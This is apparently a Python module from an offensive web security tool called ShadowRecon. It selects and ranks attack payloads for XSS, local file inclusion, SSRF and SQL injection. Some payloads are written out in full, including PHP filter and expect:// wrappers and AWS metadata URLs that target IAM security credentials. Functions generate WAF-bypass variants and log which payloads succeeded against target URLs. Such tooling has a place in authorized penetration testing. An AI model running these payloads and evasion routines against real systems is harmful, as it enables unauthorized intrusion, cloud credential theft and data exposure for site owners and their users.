"""
Payload Engine for ShadowRecon v1.0
Developed by kernelpanic | A product of infosbios

Advanced payload selection and injection management
"""

import random
import re
from typing import List, Dict, Any, Optional, Set
from enum import Enum
from dataclasses import dataclass

class PayloadType(Enum):
    XSS = "xss"
    SQLI = "sqli"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    RCE = "rce"
    XXE = "xxe"
    CSRF = "csrf"
    TEMPLATE = "template"
    NOSQL = "nosql"

class PayloadContext(Enum):
    URL_PARAMETER = "url_parameter"
    POST_DATA = "post_data"
    HEADER = "header"
    COOKIE = "cookie"
    JSON = "json"
    XML = "xml"
    FORM_INPUT = "form_input"
    FILE_UPLOAD = "file_upload"

@dataclass
class PayloadInfo:
    """Information about a payload"""
    payload: str
    payload_type: PayloadType
    context: PayloadContext
    risk_level: str
    description: str
    encoded: bool = False
    bypass_technique: Optional[str] = None

class PayloadEngine:
    """Advanced payload selection and management engine"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.payload_cache = {}
        self.used_payloads = set()
        self.successful_payloads = []

    def get_contextual_payloads(self, 
                              payload_type: str, 
                              context: str,
                              input_name: str = "",
                              max_payloads: int = 10) -> List[PayloadInfo]:
        """Get contextually appropriate payloads"""

        payloads = []

        try:
            # Import payload modules dynamically
            if payload_type.lower() == 'xss':
                from ..payloads.xss_payloads import XSSPayloads
                raw_payloads = XSSPayloads.get_context_payloads(context)[:max_payloads]

                for payload in raw_payloads:
                    payloads.append(PayloadInfo(
                        payload=payload,
                        payload_type=PayloadType.XSS,
                        context=self._map_context(context),
                        risk_level='high',
                        description=f'XSS payload for {context} context'
                    ))

            elif payload_type.lower() == 'lfi':
                from ..payloads.lfi_payloads import LFIPayloads
                raw_payloads = LFIPayloads.BASIC_LFI[:max_payloads]

                for payload in raw_payloads:
                    payloads.append(PayloadInfo(
                        payload=payload,
                        payload_type=PayloadType.LFI,
                        context=self._map_context(context),
                        risk_level='critical',
                        description='Local file inclusion payload'
                    ))

            elif payload_type.lower() == 'ssrf':
                from ..payloads.ssrf_payloads import SSRFPayloads
                raw_payloads = SSRFPayloads.AWS_METADATA[:max_payloads]

                for payload in raw_payloads:
                    payloads.append(PayloadInfo(
                        payload=payload,
                        payload_type=PayloadType.SSRF,
                        context=self._map_context(context),
                        risk_level='critical',
                        description='Server-side request forgery payload'
                    ))

            elif payload_type.lower() == 'sqli':
                from ..payloads.sqli_payloads import SQLiPayloads
                raw_payloads = SQLiPayloads.BASIC_SQLI[:max_payloads]

                for payload in raw_payloads:
                    payloads.append(PayloadInfo(
                        payload=payload,
                        payload_type=PayloadType.SQLI,
                        context=self._map_context(context),
                        risk_level='critical',
                        description='SQL injection payload'
                    ))

        except ImportError:
            if self.verbose:
                print(f"[!] Could not load {payload_type} payloads")

        # Filter unique payloads
        unique_payloads = []
        seen_payloads = set()

        for payload_info in payloads:
            if payload_info.payload not in seen_payloads:
                seen_payloads.add(payload_info.payload)
                unique_payloads.append(payload_info)

        return unique_payloads

    def _map_context(self, context: str) -> PayloadContext:
        """Map string context to PayloadContext enum"""
        context_mapping = {
            'url_parameter': PayloadContext.URL_PARAMETER,
            'post_data': PayloadContext.POST_DATA,
            'header': PayloadContext.HEADER,
            'cookie': PayloadContext.COOKIE,
            'json': PayloadContext.JSON,
            'xml': PayloadContext.XML,
            'form_input': PayloadContext.FORM_INPUT,
            'file_upload': PayloadContext.FILE_UPLOAD
        }

        return context_mapping.get(context.lower(), PayloadContext.URL_PARAMETER)

    def generate_adaptive_payloads(self, 
                                 target_info: Dict[str, Any], 
                                 payload_type: str) -> List[PayloadInfo]:
        """Generate payloads adapted to target characteristics"""

        adaptive_payloads = []

        # Technology-based payload adaptation
        technologies = target_info.get('technologies', [])

        if 'php' in technologies and payload_type == 'lfi':
            # PHP-specific LFI payloads
            php_payloads = [
                'php://filter/convert.base64-encode/resource=index.php',
                'php://input',
                'expect://whoami'
            ]

            for payload in php_payloads:
                adaptive_payloads.append(PayloadInfo(
                    payload=payload,
                    payload_type=PayloadType.LFI,
                    context=PayloadContext.URL_PARAMETER,
                    risk_level='critical',
                    description='PHP-specific LFI payload'
                ))

        if 'wordpress' in technologies and payload_type == 'xss':
            # WordPress-specific XSS payloads
            wp_payloads = [
                '<script>alert("WP-XSS")</script>',
                '{{constructor.constructor("alert(\'WP\')")()}}',
                '[xss]<script>alert("WP")</script>[/xss]'
            ]

            for payload in wp_payloads:
                adaptive_payloads.append(PayloadInfo(
                    payload=payload,
                    payload_type=PayloadType.XSS,
                    context=PayloadContext.FORM_INPUT,
                    risk_level='high',
                    description='WordPress-specific XSS payload'
                ))

        if 'aws' in technologies and payload_type == 'ssrf':
            # AWS-specific SSRF payloads
            aws_payloads = [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data'
            ]

            for payload in aws_payloads:
                adaptive_payloads.append(PayloadInfo(
                    payload=payload,
                    payload_type=PayloadType.SSRF,
                    context=PayloadContext.URL_PARAMETER,
                    risk_level='critical',
                    description='AWS metadata SSRF payload'
                ))

        return adaptive_payloads

    def apply_encoding(self, payload: str, encoding_type: str) -> str:
        """Apply encoding to payload for WAF bypass"""

        try:
            if encoding_type == 'url':
                import urllib.parse
                return urllib.parse.quote(payload, safe='')

            elif encoding_type == 'double_url':
                import urllib.parse
                encoded_once = urllib.parse.quote(payload, safe='')
                return urllib.parse.quote(encoded_once, safe='')

            elif encoding_type == 'html':
                import html
                return html.escape(payload)

            elif encoding_type == 'base64':
                import base64
                return base64.b64encode(payload.encode()).decode()

            elif encoding_type == 'hex':
                return ''.join(f'\\x{ord(c):02x}' for c in payload)

            elif encoding_type == 'unicode':
                return ''.join(f'\\u{ord(c):04x}' for c in payload)

        except Exception as e:
            if self.verbose:
                print(f"[!] Encoding error: {e}")

        return payload

    def generate_bypass_payloads(self, original_payload: str, 
                               bypass_techniques: List[str]) -> List[str]:
        """Generate bypass variants of a payload"""

        bypass_payloads = []

        for technique in bypass_techniques:
            if technique == 'case_variation':
                # Random case variations
                varied = ''.join(random.choice([c.upper(), c.lower()]) for c in original_payload)
                bypass_payloads.append(varied)

            elif technique == 'comment_injection':
                # SQL comment injection
                if 'SELECT' in original_payload.upper():
                    bypass_payloads.append(original_payload.replace('SELECT', 'SEL/**/ECT'))
                if '<script>' in original_payload.lower():
                    bypass_payloads.append(original_payload.replace('<script>', '<scr/**/ipt>'))

            elif technique == 'whitespace_variation':
                # Different whitespace characters
                whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
                for ws in whitespace_chars:
                    modified = original_payload.replace(' ', ws)
                    if modified != original_payload:
                        bypass_payloads.append(modified)

            elif technique == 'null_byte':
                # Null byte injection
                bypass_payloads.append(original_payload + '\x00')
                bypass_payloads.append(original_payload + '%00')

            elif technique == 'concatenation':
                # String concatenation for SQL
                if "'" in original_payload:
                    bypass_payloads.append(original_payload.replace("'", "'+'"))

        return bypass_payloads

    def prioritize_payloads(self, payloads: List[PayloadInfo], 
                          target_characteristics: Dict[str, Any]) -> List[PayloadInfo]:
        """Prioritize payloads based on target characteristics"""

        def calculate_priority_score(payload_info: PayloadInfo) -> float:
            score = 0.0

            # Risk level scoring
            risk_scores = {'critical': 3.0, 'high': 2.0, 'medium': 1.0, 'low': 0.5}
            score += risk_scores.get(payload_info.risk_level, 0.5)

            # Context relevance scoring
            if payload_info.context == PayloadContext.URL_PARAMETER:
                score += 1.0  # Most common testing context

            # Technology-specific scoring
            technologies = target_characteristics.get('technologies', [])
            if payload_info.payload_type == PayloadType.XSS and 'javascript' in technologies:
                score += 1.5
            if payload_info.payload_type == PayloadType.LFI and 'php' in technologies:
                score += 1.5
            if payload_info.payload_type == PayloadType.SSRF and 'aws' in technologies:
                score += 2.0

            # Bypass technique bonus
            if payload_info.bypass_technique:
                score += 0.5

            return score

        # Sort payloads by priority score (highest first)
        prioritized = sorted(payloads, key=calculate_priority_score, reverse=True)

        return prioritized

    def track_payload_success(self, payload: str, payload_type: str, 
                            target_url: str, success_indicators: Dict[str, Any]):
        """Track successful payloads for learning"""

        success_info = {
            'payload': payload,
            'payload_type': payload_type,
            'target_url': target_url,
            'success_indicators': success_indicators,
            'timestamp': __import__('datetime').datetime.now()
        }

        self.successful_payloads.append(success_info)

        if self.verbose:
            print(f"[+] Successful payload tracked: {payload_type} on {target_url}")

    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get payload usage and success statistics"""

        stats = {
            'total_payloads_used': len(self.used_payloads),
            'successful_payloads': len(self.successful_payloads),
            'success_rate': 0.0,
            'payload_type_distribution': {},
            'most_successful_payload_types': []
        }

        if self.used_payloads:
            stats['success_rate'] = len(self.successful_payloads) / len(self.used_payloads)

        # Payload type distribution
        type_counts = {}
        for success in self.successful_payloads:
            payload_type = success['payload_type']
            type_counts[payload_type] = type_counts.get(payload_type, 0) + 1

        stats['payload_type_distribution'] = type_counts
        stats['most_successful_payload_types'] = sorted(
            type_counts.items(), key=lambda x: x[1], reverse=True
        )

        return stats
